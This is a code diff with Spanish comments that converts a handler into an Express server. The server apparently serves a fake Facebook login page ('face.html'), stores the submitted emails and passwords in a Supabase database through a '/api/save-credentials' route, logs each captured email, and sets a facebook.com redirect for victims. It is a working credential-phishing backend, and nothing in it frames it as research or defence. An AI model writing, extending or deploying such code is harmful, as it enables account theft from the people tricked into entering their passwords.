@@ -1,19 +1,19 @@
+require('dotenv').config();
+const REDIRECT_URL = 'https://www.facebook.com'; // Cambia aquí
+const express = require('express');
+const cors = require('cors');
+const path = require('path');
 const { createClient } = require('@supabase/supabase-js');
 
-module.exports = async (req, res) => {
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-    if (req.method === 'OPTIONS') {
-        res.status(200).end();
-        return;
-    }
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname)));
 
-    if (req.method !== 'POST') {
-        return res.status(405).json({ message: 'Método no permitido' });
-    }
-
+// Ruta para guardar credenciales
+app.post('/api/save-credentials', async (req, res) => {
     try {
         const { email, password } = req.body;
 
@@ -40,10 +40,21 @@ module.exports = async (req, res) => {
             return res.status(500).json({ message: `Error de base de datos: ${error.message}` });
         }
 
+        console.log('Credenciales guardadas:', email);
         res.status(200).json({ message: 'Credenciales guardadas', data });
 
     } catch (error) {
         console.error('Error:', error);
         res.status(500).json({ message: `Error del servidor: ${error.message}` });
     }
-};
+});
+
+// Ruta para servir face.html en la raíz
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'face.html'));
+});
+
+app.listen(PORT, () => {
+    console.log(`✓ Servidor corriendo en http://localhost:${PORT}`);
+    console.log(`✓ Abre http://localhost:${PORT} en tu navegador`);
+});
